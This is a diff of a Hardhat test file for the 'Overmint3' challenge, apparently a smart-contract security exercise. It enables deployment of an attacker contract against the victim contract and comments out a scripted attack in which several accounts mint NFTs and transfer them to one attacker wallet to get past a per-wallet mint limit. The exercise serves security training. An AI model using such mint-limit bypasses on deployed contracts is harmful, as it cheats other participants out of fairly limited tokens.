@@ -8,7 +8,7 @@ const { ethers } = require("hardhat");
 
 const NAME = "Overmint3"
 
-describe(NAME, function () {
+describe.only(NAME, function () {
     async function setup() {
         const [owner, attackerWallet] = await ethers.getSigners();
 
@@ -25,17 +25,17 @@ describe(NAME, function () {
         })
 
         it("conduct your attack here", async function () {
-//            const AttackerFactory = await ethers.getContractFactory("Overmint3Attacker");
-//            const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address, attackerWallet.address);
+            const AttackerFactory = await ethers.getContractFactory("Overmint3Attacker");
+            const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
 
-            victimContract.connect(attackerWallet).mint();
-
-            const signers = await ethers.getSigners();
-            let tokenId = 2;
-            for (let i = 11; i < 15; ++i) {
-                victimContract.connect(signers[i]).mint();
-                victimContract.connect(signers[i]).transferFrom(signers[i].address, attackerWallet.address, tokenId++);
-            }
+//            victimContract.connect(attackerWallet).mint();
+//
+//            const signers = await ethers.getSigners();
+//            let tokenId = 2;
+//            for (let i = 11; i < 15; ++i) {
+//                victimContract.connect(signers[i]).mint();
+//                victimContract.connect(signers[i]).transferFrom(signers[i].address, attackerWallet.address, tokenId++);
+//            }
         });
 
         after(async function () {
